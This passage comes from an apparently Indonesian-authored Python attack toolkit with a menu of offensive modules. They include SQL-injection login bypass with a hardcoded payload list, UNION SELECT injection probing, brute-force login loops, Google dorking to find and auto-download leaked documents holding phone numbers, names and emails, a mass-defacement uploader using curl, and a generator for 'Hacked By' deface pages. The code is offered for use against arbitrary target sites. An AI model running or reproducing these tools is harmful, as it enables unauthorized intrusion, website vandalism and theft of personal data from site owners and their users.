        nick_lines = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "admin", "", "admin123", "admin123456789", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+"]
        password_lines = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "admin", "", "admin123", "admin123456789", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+"]

        for nick in nick_lines:
            for password in password_lines:
                try:
                    # Membuat payload untuk data login
                    payload = {
                        idn : nick,
                        idp : password
                    }

                    # Melakukan permintaan POST untuk login
                    session = requests.Session()
            
                    print(green + f"---------------------------")
                    print(info + f"Trying Nick: {nick}")
                    print(f"Password: {password}")
                    print(payload)
                    print(green + f"---------------------------")
                    response = session.post(login_url, data=payload)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Temukan token CSRF jika diperlukan
                    csrf_token1 = soup.find('input', {f'{idn}': 'csrf_token'}, id=idn)['value'] if soup.find('input', {f'{idn}': 'csrf_token'}, id=idn) else ''
                    csrf_token2 = soup.find('input', {f'{idp}': 'csrf_token'}, id=idp)['value'] if soup.find('input', {f'{idp}': 'csrf_token'}, id=idp) else ''
            
                    csrf_token = csrf_token1 + csrf_token2
                    # Tambahkan token CSRF ke data login
                    payload['csrf_token'] = csrf_token
                    # Memeriksa apakah login berhasil
                    keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' 
                    
                    if re.search(keyword, response.text, re.IGNORECASE):
                            print(success + f'Login Success !')
                            print(response)
                            break  # Keluar dari loop jika login berhasil
                    else:
                        print(fail + f'Login Failed.')
                        print(response)
                except requests.exceptions.ReadTimeout:
                    print("Request Timed Out, Please Wait..")
                    continue
        print(success + f"[ + ] Done.. [ + ]")
    elif answer == ("6"):
        if os.name == "posix":
            os.system("clear")
        if os.name == "nt":
            os.system("cls")
        print(white + f"""
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣶⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⢯⣗⣲⣤⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⢀⡤⠖⠚⠉⠉⠉⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀        ⠀⣠⣤⣶⣶⣶⡆⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⢀⡀⠀⠀⠐⠚⠁⣀⠀⠀⠀⣴⠚⠉⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀        ⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠛⠁⠀⠀⢀⡴⠋⠀⠀⠀⢀⣠⠚⠁⢀⣴⠖⠁⠀⢰⠀⢰⡀⠀⠀⠈⠻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀        ⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⡟⠑⠀⠀⠀⣠⠟⠀⠀⠀⠀⣠⠞⠁⠀⣠⠞⠁⠀⠀⢠⡟⠀⢸⣧⠀⠀⢀⠀⠈⢿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀        ⣠⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠏⠀⠀⠀⠀⣰⠋⠀⠀⠀⢠⡾⠃⠀⢀⣴⠋⠀⠀⠀⣴⢿⠃⠀⡎⠹⣧⠀⠈⣷⡀⠈⣿⡇⠀⠀⠀⠀⠀⠀
⠀        ⢰⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣶⠇⠀⠀⢀⡇⣰⠇⡔⠀⠀⣰⡟⠁⠀⣠⣾⠃⠀⠀⢀⡞⢁⡟⠀⣼⠁⠀⢻⡦⠄⠸⣷⠀⢹⣸⠀⠀⠀⠀⠀⠀
⠀        ⣾⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⣼⢁⣏⡞⠀⢀⣼⠏⠀⣴⡿⢣⠏⠀⢀⣾⠋⠀⡼⠁⣼⠃⠀⠀⢸⣷⢤⣤⣿⠀⠈⣿⠀⠀⠀⠀⠀⠀
        ⢰⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠐⠀⢰⠇⡾⠺⣄⣰⠋⡏⣠⣾⡟⠁⡞⠀⣰⣿⠃⠀⣰⢃⡼⠁⠀⠀⠀⢸⢳⡶⠒⣿⠀⠀⣿⠀⠀⠀⠀⠀⠀
        ⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠋⣾⡈⢠⣄⣀⣸⣰⡇⢀⡼⠙⢾⣴⣫⠏⠀⢠⠇⡴⠁⠃⠀⣰⣧⠞⠁⠀⠀⠀⠀⢸⠀⡇⠀⡇⠀⢀⢸⡀⠀⠀⠀⠀⠀
        ⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡇⢸⣿⣿⠛⣿⣿⠿⢷⣶⣿⣶⣿⣭⣶⣾⣿⣁⣀⡀⣼⣽⡧⠶⠒⠉⠉⠉⠀⡎⢰⡇⢸⠁⠀⡞⢸⠀⠀⠀⠀⠀⠀
        ⠸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⣿⣿⡀⢹⡟⢀⠀⣿⡏⢸⣿⣿⠏⠉⣿⣿⣿⡿⢿⣿⡿⠿⣶⣶⣶⣶⣾⣥⣼⣇⣞⣆⣸⠁⣿⠀⠀⠀⠀⠀⠀
        ⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢏⣇⣾⣿⣿⡇⠸⢀⣿⠀⡏⢀⣿⣿⠏⣰⡇⢸⣿⣿⠁⢸⣿⠁⣷⣶⣤⣾⡟⠉⣿⣿⡟⢹⣿⡏⣼⣿⠀⠀⠀⠀⠀⠀
⠀       ⢸⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⡼⡃⢸⣿⣿⣿⣿⣇⣀⣼⣿⡇⠀⣼⣿⠋⢀⣉⣉⠀⢿⣿⠀⣸⡟⠀⣉⣉⣹⣿⡇⢰⣿⣿⠃⢸⣿⡿⠋⣿⡆⠀⠀⠀⠀⠀
⠀        ⠻⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢠⠞⣹⢡⣿⢻⡏⢹⢿⣿⣟⠛⠻⠿⠿⠿⠷⣶⣿⣿⣿⣦⣸⣯⣀⣿⡇⢀⣿⣿⣿⣿⡇⠸⣿⡿⠀⣾⣿⠁⢰⣿⣷⡀⠀⠀⠀⠀
⠀        ⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣶⣴⠏⢀⣧⡿⣿⠸⣿⠸⣎⢻⣿⡻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠛⠛⠻⠿⠿⠿⢿⣿⣶⣤⣤⣾⣿⣿⢀⣿⠉⢧⡻⠄⠀⠀⠀
⠀⠀⠀        ⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⠀⣾⡟⠀⣿⠀⢻⡇⢹⣆⠹⣧⠈⠳⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⢺⣿⡟⠉⣹⣿⣾⢿⡄⠈⢳⡀⠀⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⠉⠻⢿⣿⣿⡏⡀⣿⠁⠀⠸⣧⠈⢷⢸⢻⣷⣬⣷⣀⠀⠀⠀⠀⢰⣶⣾⣯⣽⣳⣦⣤⠀⠀⠀⠀⠀⠀⣠⡿⢋⣠⣾⡷⢛⢻⣿⣇⡇⢸⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠈⠙⢇⠙⠾⣆⠀⠀⠘⢷⣿⡟⢀⡙⢧⣿⣿⣛⠲⠄⠀⠸⣿⡏⠀⠀⢙⣿⡇⠀⠀⠦⠤⢤⣶⣯⣾⢟⣫⡿⠁⣎⡾⠈⣿⢧⡞⢸⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⢀⠴⠚⢧⡀⠈⠓⠄⢀⡴⠋⠙⠷⣶⡶⠾⣿⣿⣿⣃⡀⠀⠉⢅⣀⣀⣘⡿⠁⠀⠀⣀⣴⣿⡿⠟⣻⡿⠋⢀⣾⣟⡁⢠⣿⠟⣠⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⢀⡏⠀⠀⠀⠉⠓⠶⠦⣤⣀⡠⢤⣀⣈⣽⡳⠯⣿⣿⣿⣿⣾⣄⡀⠀⠀⢀⣀⣤⣶⣿⡿⢟⡥⠴⠾⢥⣤⠞⣻⠋⠀⠙⣿⡵⢟⡁⠻⢤⡀⠀
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⣼⢹⠀⠀⢠⠀⠀⠀⠀⣀⣀⡉⠛⡿⠋⠀⣿⣄⢸⡿⣇⠹⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠉⣙⣇⠀⠀⠀⠙⡾⠁⠀⠀⣠⠋⠉⢳⡙⠲⣄⠁⠀
⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⣿⠈⡆⠀⠘⡇⠀⠀⢸⡁⠀⠙⣾⠁⠀⢸⠉⠻⣆⡇⢹⣀⠈⠙⢿⣿⣿⣿⢿⡏⠀⣠⠞⣡⢜⣳⡄⠀⢰⠁⠀⣠⠞⠁⠀⣠⠞⠉⡇⠈⢳⡀
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⢹⠀⠸⡄⠀⢹⡀⣤⠒⢧⡀⠀⠈⣇⠀⢸⡀⠀⢹⠇⣼⠉⢙⠦⢄⣈⡉⠀⠼⡄⣼⠃⣴⡟⠋⢹⠇⠀⣼⠀⢠⠇⠀⣠⠾⠁⠀⠀⠛⠀⠀⣷
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠼⡆⠀⠱⡄⠀⡧⢿⡀⠀⠳⡄⠀⠸⡦⠀⢳⣴⣫⠾⠛⣷⣸⡀⠀⢂⠀⠀⠀⣻⣿⣰⠋⠀⠀⣿⠀⠀⠹⠤⢾⣀⡾⠁⢀⡠⠀⠀⠀⠀⠀⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⡅⠀⠙⣄⠀⠙⢦⡀⣿⠀⠀⢹⡀⣀⣀⣼⡍⠻⠿⠙⢶⠞⠛⠉⣻⣿⠀⠀⠀⠘⢦⡀⠀⠀⠀⠈⠛⠒⠻⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠛⠳⠆⠈⠳⠤⠨⠗⠛⠀⠀⠀⠏⠻⠇⠼⠁⠂⠀⠀⠀⠃⠀⠸⠋⠿⠷⠄⠀⠰⠃⠙⠲⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
        print('')
        print("If You Want Skip Some Extension You Dont Want To Leak, Just Click CTRL + C..")
        target = input(info + f"Target Sites : ")
        print('Please Wait..')
        file_types = ['doc', 'dta', 'shx', 'dbf', 'shp', 'db', 'mdf', 'mpd', 'ndb', 'docx', 'docm', 'dot', 'dotx', 'dotm','csv', 'pdf', 'xls', 'xlsx', 'xslsm', 'xlt', 'xltx', 'xltm', 'sql', 'txt', 'zip', 'rar', 'rar4', 'xyz']
	
        resultdork = ""
        for i in file_types:
            try:
                cookies = exists('.google-cookie')
                if cookies == True:
                    os.remove('.google-cookie')
                print("")
                print("")
                print(white + f"=================================")
                print(white + f"File Types : {i}")
                print(white + f"=================================")
                print("")
                print("")
                for results in search(f'site:{target} filetype:{i}', tld='com', num=5, start=0, stop=None, pause=20):
                    print(success + results)
                    def log(target):
                        file = open((target) + ".txt", "a")
                        file.write(str(results))
                        file.write("\n")
                        file.close
                        file_name = target
                    log(target)
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(15)
            except KeyboardInterrupt:
                print(f"[ + ] File Extension : {i} Skipped.. [ + ]")
                continue
        print(success + f"[ + ] Done.. [ + ]")
    if answer == ("7"):
        try:
            print("""\033[1;33m
        
            ██████╗ ███████╗███████╗ █████╗  ██████╗███████╗██████╗ 
            ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
            ██║  ██║█████╗  █████╗  ███████║██║     █████╗  ██████╔╝
            ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
            ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗██║  ██║
            ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
                                                       
                                     MASS DEFACE                       
                                       For PC
            """)
            pass
            files2 = input(f'\nFile [example : hai.html] : ')
            file_path = f'{files2}'
            def flogger(files2, file_path):
                print('')
            while True:
                pass     
                upload_url = input(f'\033[1;34m\nSite Target : ')
        
                with open(file_path, 'rb') as file:
                    file_data = file.read()

                # Membuat dictionary dengan file yang akan diunggah
                files = {'file': (f'{files2}', file_data, 'application/octet-stream')}
        
                response = os.system(f'curl -T {file_path} {upload_url}')
            
                # Mengecek apakah file berhasil diunggah
                if response == True:
                    print(fail + f"File Failed Uploaded.")
                else:
                    print(success + f"Results: ")
                    print(f'{upload_url}/{files2}')     
        except FileNotFoundError:
            print(fail + f'File {files2} Not Found On Pandora Folder!')
    elif answer == "8":
        try:
            url = input(f"URL TARGET : ")
            list = input(f"File List: ")
            print("Please Wait...")
            time.sleep(1.3)
            file_name = list
            with open(file_name, 'rb') as file:
                file_content = file.read()
            file_content_str = file_content.decode('utf-8')
            text = file_content_str.split()
            for a in text:
                rand_user = random.choice(user_agents)
                def get_folder_size(trgt):
                    try:
                        if response.status_code == 200:
                            folder_content = response.content
                            size_bytes = len(folder_content)
                            size_kb = size_bytes / 1024
                            size_mb = size_kb / 1024
                            size_gb = size_mb / 1024
                            return size_bytes, size_kb, size_mb, size_gb
                        else:
                            return None 
                    except requests.exceptions.RequestException as e:
                        print(f"Error: {e}")
                        return None
                trgt = f'{url}{a}'
                response = requests.get(trgt)
                results = get_folder_size(trgt)
                size_bytes = results
                print(f"Testing : {trgt}")
                print(success + f'Results: ')
                print(response)
                print(trgt)
                print(size_bytes)
        except KeyboardInterrupt:
            print("bye")
            exit()
        except FileNotFoundError:
            print(f"File {list} Doesn't Exists On Folder PANDORA!")
            exit()
        except requests.exceptions.InvalidURL:
            print(f"Error While Compiling {trgt}")
    elif answer == "9":
        try:
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("""\033[1;91m
                        .-~~.    .--.    .~~-.
                    .-~.-~.- `. { O ]]&gt;.' -.~-.~-.
                .-~.-~.-~.-~.  \ | |  /  .~-.~-.~-.~-.
            .-~.-~.-~.-~.-~.-~. V   \/ .~-.~-.~-.~-.~-.~-.
                      ~  ~.-~.- {    } -.~-.~  ~
                           ~ -~.~\  /~.~- ~
                                 //\\
                             :--""--""--:
                             \~~~~~~~~~~/
                              \ Hacked /
                               \      /
                                \____/
            """)
            print("Skip If The ID and NAME Isn't available")
            file = input(f"File TXT : ")
            login_url = input(f"URL LOGIN PAGE TARGET : ")
            idu = input(f"ID For Username : ")
            idp = input(f"ID For Password : ")
            nmu = input(f"Name For Username On Input : ")
            nmp = input(f"Name For Password On Input : ")
            file_name = file
            with open(file_name, 'rb') as files:
                files_content = files.readline()
            files_content_str = files_content
            nick_lines = files_content_str.split()
            password_lines = files_content_str.split()
            while True:
                for nick in nick_lines:
                    for password in password_lines:
                        try:
                                # Membuat payload untuk data login
                            payload = {
                                idu : nick,
                                idp : password
                            }

                            # Melakukan permintaan POST untuk login
                            session = requests.Session()
            
                            print(green + f"---------------------------")
                            print(info + f"Trying Nick: {nick}")
                            print(f"Password: {password}")
                            print(payload)
                            print(green + f"---------------------------")
                            response = session.post(login_url, data=payload)
                            soup = BeautifulSoup(response.text, 'html.parser')

                            user_data = f'<input type="text" id="{idu}" name="{nmu}">'
                            pass_data = f'<input type="password" id="{idp}" name="{nmp}">'
                            yo = user_data + pass_data
                            response = requests.post(login_url, data=yo)
                            keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' 
                            response = requests.post(login_url, data={f'{nmu}': nick})
                            response = requests.post(login_url, data={f'{nmp}': password})
                            if re.search(keyword, response.text, re.IGNORECASE):
                                    print(success + f'Login Success !')
                                    print(response)
                                    def log(login_url):
                                       file = open((login_url) + ".txt", "a")
                                       file.write(str(payload))
                                       file.write("\n")
                                       file.close
                                       file_name = login_url
                                    log(login_url)
                            else:
                                print(fail + f'Login Failed.')
                                print(response)
                        except requests.exceptions.ReadTimeout:
                            print("Request Timed Out, Please Wait..")
                            continue
                    print(success + f"[ + ] Done.. [ + ]")
        except KeyboardInterrupt:
            print("Interrupt")
            exit()
    elif answer == "10":
        if os.name == "posix":
            os.system('clear')
        elif os.name == "nt":
            os.system('cls')
        print(f"""
        
        {red} ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗     ██████╗ ██████╗ 
        {green}██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗██╔══██╗
        {blue}██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██║  ██║    ██║  ██║██████╔╝
        {yellow}██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║    ██║  ██║██╔══██╗
        {red}╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝    ██████╔╝██████╔╝
        {green} ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝ ╚═════╝ 
                                                                            
        """)
        try:
            ip = ['']
            files = input(f"File Extension [example : pdf xls csv] : ")
            site = input(f"Target Site : ")
            date = input(f"File Date Created [example : 2023] : ")
            data = input(f"Data [example : phone,name,email] : ")
            mode = input(f"Save As TXT / Auto Download ? txt/download : ")
        except FileExistsError:
            print(fail + f"File {site} Is Exists.. Do You Want To Delete It?")
            o = input("Y/N : ")
            if o == "Y" or "y":
                os.removedirs(site)
            else:
                exit()
        if mode == "download":
            try:
                os.mkdir(site)
                file_list = files.split()
                result = file_list
                print('')
                print('[!] Please Wait [!]')  
                print(f"[ + ] All Results Will Be Downloaded On Folder {site} [ + ]")
                time.sleep(0.6)
                for i in result:
                    try:
                        print(info + f"[ + ]Searching Info For [ + ] : {i}")
                        num = 0
                        num = num + 1
                        rand_user = random.choice(user_agents)
                        for results in search(f'filetype:{i} site:{site} intext:{data} {date}', tld='com', lang='en', num=int(num), pause=2, stop=0, start=0):
                            if results:
                                print('')
                                print(success + results)
                                wget.download(results, out=site)
                            else:
                                print(white + f"[!] Couldn't Find For {i} Site : {site}")
                    except urllib.error.HTTPError as e:
                        if e.code == 429:
                            print(fail + f"[!] 429 Error !!, Coldown For 25 Sec.. [!]")
                            time.sleep(25)
                        if e.code == 403:
                            print(fail + f"[!] 403, File Forbidden To Download.. [!]")
                            continue
                        if e.code == 404:
                            print(fail + f"[!] File Didn't Exists.. [!]")
                            continue
                        if e.code == 1006:
                            print(fail + f"[!] Error While Running Task.. [!]")
                            exit()
                    except requests.exceptions.ConnectTimeout:
                        continue
                    except urllib.error.URLError:
                        continue
                    except KeyboardInterrupt:
                        print(info + f"[!] File Type : {i} Skipped.. [!]")
                    except IndexError:
                        continue
                    except EOFError:
                        continue
            except FileExistsError:
                 print(fail + f"[!] File {site} Already Exists [!]")
                 delete = input(f"Delete? y/n : ")
                 if delete == "Y" or "y":
                     os.removedirs(site)
                     pass
                 else:
                     exit()
        elif mode == "txt":
            try:
                file_list = files.split()
                result = file_list
                print('')
                print('[!] Please Wait [!]')
                time.sleep(0.6)
                for i in result:
                    try:
                        print(info + f"[ + ] Searching Results For {i}.. [ + ]")
                        rand_user = random.choice(user_agents)
                        req = 1
                        req = req + 1
                        for results in search(f'filetype:{i} site:{site} intext:{data} {date}', num=int(req), pause=2, stop=None, start=0):
                            if results:
                                print('')
                                print(success + results)
                                def log(site):
                                    file = open((site) + ".txt", "a")
                                    file.write(str(results))
                                    file.write("\n")
                                    file.close
                                    file_name = site
                                log(site)
                            else:
                                print(fail + f"[!] File {i} Doesn't Exists [!]")
                    except urllib.error.HTTPError as e:
                        if e.code == 429:
                            print(fail + f"[!] Error 429.. Coldown 25 sec.. [!]")
                            time.sleep(25)
                    except KeyboardInterrupt:
                        print("Interrupt")
                        exit()
                    except urllib.error.URLError:
                        continue
                print(success + f"[ + ] Done.. [ + ]")
            except FileExistsError:
                print(fail + f"[!] File {site}.txt Already Exists [!]")
                delete = input(f"Delete? y/n : ")
                if delete == "Y" or "y":
                    os.removedirs(site)
                else:
                    exit()
    elif answer == "11":
        pass
        if os.name == "posix":
            os.system('clear')
        elif os.name == "nt":
            os.system('cls')
        print("the target must have parameters !, [e.x : https://fuck.you/index.php?id=]")
        i = input(green + f"Target URL : ")
        en_int = int(input("Value : "))
        while True:
            try:
                en_int +=1
                result = str(f'{i}{en_int}')
                print(info + f"[ + ] Checking URL with id {en_int} url : {result} [ + ]")
                response = requests.get(result)
                if response.status_code == 200:
                    print(success + f'{response}')
                    time.sleep(2)
                else:
                    print(fail + f"Code : ", response)
                    time.sleep(2)
                t = '),('.join(str(t) for t in range(1, en_int + 1))
                result = f'({t})'
                onion = (f'+AND+0+UNION(SELECT{result})')  
                print('')
                print(info + f"[ + ] Checking Url With : {onion}")
                y = str(f'{i}{onion}')
                print(y)
                response = requests.get(y)
                if response.status_code == 200:
                    print(success + f'{response}')
                    time.sleep(2)
                else:
                    print(fail + f'Code : ', response)
                    time.sleep(2)
                result = ', '.join(str(i) for i in range(1, en_int + 1))
                onion = ('+AND+0+UNION+SELECT+')
                print(info + f"[ + ] Checking target with : {onion}{result}")
                t = str(f'{i}{onion}{result}')
                print(t)
                response = requests.get(t)
                if response.status_code == 200:
                    print(success + f'{response}')
                    time.sleep(2)
                else:
                    print(fail + f'Code : ', response)
                    time.sleep(2)
            except KeyboardInterrupt:
                print("Exit")
                exit()
    elif answer == "12":
        pass
        if os.name == "posix":
            os.system('clear')
        elif os.name == "nt":
            os.system('cls')
        print("""
        ███╗   ███╗ █████╗ ███████╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗███████╗
        ████╗ ████║██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
        ██╔████╔██║███████║███████╗███████╗    ██║  ██║██║   ██║██████╔╝█████╔╝ ███████╗
        ██║╚██╔╝██║██╔══██║╚════██║╚════██║    ██║  ██║██║   ██║██╔══██╗██╔═██╗ ╚════██║
        ██║ ╚═╝ ██║██║  ██║███████║███████║    ██████╔╝╚██████╔╝██║  ██║██║  ██╗███████║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        """)
        try:
            print(info + f"Example : dorks = inurl:/admin/dashboard.php,inurl:/review.php?id=,inurl:/admin intext:welcome")
            dork = input(blue + f"dorks = ")
            e = dork.split(',')
            dorks = e
            
            for i in dorks:
                rand_user = random.choice(user_agents)
                print(info + f"[ + ] Searching : {i} [ + ]")
                for results in search(f'{i}', num=int(1), start=0, stop=None, pause=4):
                    if results:
                        print(success + results)
                    else:
                        print(fail + f"[!] Couldn't Find In This Dork [!]")
        except urllib.error.HTTPError as e:
            if e.code == 429:
                print(fail + f"[!] 429 Error [!]")
        except KeyboardInterrupt:
            print(green + f"Skipped")
    elif answer == "13":
        pass
        if os.name == "posix":
            os.system('clear')
        elif os.name == "nt":
            os.system('cls')
        print(f"{red_t}██████{gray}╗ {red_t}██████{gray}╗  {red_t}██████{gray}╗       {red_t}██████{gray}╗ {red_t}███████{gray}╗{red_t}███████{gray}╗ {red_t}█████{gray}╗  {red_t}██████{gray}╗{red_t}███████{gray}╗")
        print(f"{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔═══{red_t}██{gray}╗      {red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔════╝{red_t}██{gray}╔════╝{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔════╝{red_t}██{gray}╔════╝")
        print(f"{red_t}██████{gray}╔╝{red_t}██████{gray}╔╝{red_t}██{gray}║   {red_t}██{gray}║{red_t}█████{gray}╗{red_t}██{gray}║  {red_t}██{gray}║{red_t}█████{gray}╗  {red_t}█████{gray}╗  {red_t}███████{gray}║{red_t}██{gray}║{red_t}     {red_t}█████{gray}╗")
        print(f"{red_t}██{gray}╔═══╝ {red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}║   {red_t}██{gray}║{gray}╚════╝{red_t}██{gray}║  {red_t}██{gray}║{red_t}██{gray}╔══╝  {red_t}██{gray}╔══╝  {red_t}██{gray}╔══{red_t}██{gray}║{red_t}██{gray}║     {red_t}██{gray}╔══╝")
        print(f"{red_t}██{gray}║     {red_t}██{gray}║  {red_t}██{gray}║╚{red_t}██████{gray}╔╝      {red_t}██████{gray}╔╝{red_t}███████{gray}╗{red_t}██{gray}║     {red_t}██{gray}║  {red_t}██{gray}║╚{red_t}██████{gray}╗{red_t}███████{gray}╗")
        print(f"{gray}╚═╝     ╚═╝  ╚═╝ ╚═════╝       ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝{white}")
        # 6 Deface SC
        print(f"{red_t}╔═══════════════════════════════════════╗")
        print(f"{red_t}╟ {gray}1. Deface 1{red_t}                           ║")
        print(f"{red_t}╟ {gray}2. Deface 2{red_t}                           ║")
        print(f"{red_t}╟ {gray}3. Deface 3{red_t}                           ║")
        print(f"{red_t}╟ {gray}4. Deface 4{red_t}                           ║")
        print(f"{red_t}╟ {gray}5. Deface 5{red_t}                           ║")
        print(f"{red_t}╟ {gray}6. Deface 6{red_t}                           ║")
        print(f"{red_t}╚═══════════════════════════════════════╝")
        choice = input(f"Choice : ")
        try:
            os.mkdir('Deface')
        except FileExistsError:
            pass
        if choice == "1":
            pass
            name = input(info + f"Attacker name : ")
            team = input(info + f"Team name : ")
            msg = input(info + f"Message : ")
            file_name = input(info + f"Save as [e.x : sanzz]: ")
            grts = input(f"Greetz : ")
            e = input(info + f"Photo / Logo [Skip for default icon]: ")
            width = input("Logo Width [Default : 300] : ")
            height = input("Logo Height [Default : 300] : ")
            if e:
                logo = e
            else:
                logs = ['https://kosred.com/a/saewlg.jpeg']
                logo = random.choice(logs)
            sc1 = f"""
            <font color="white">
            <head>
                <title>HackedBy{name}</title>
                <table width="100%" height="90%">
                <tbody><tr><td align="center">
            <br><br>
            <br><br><font color="white">
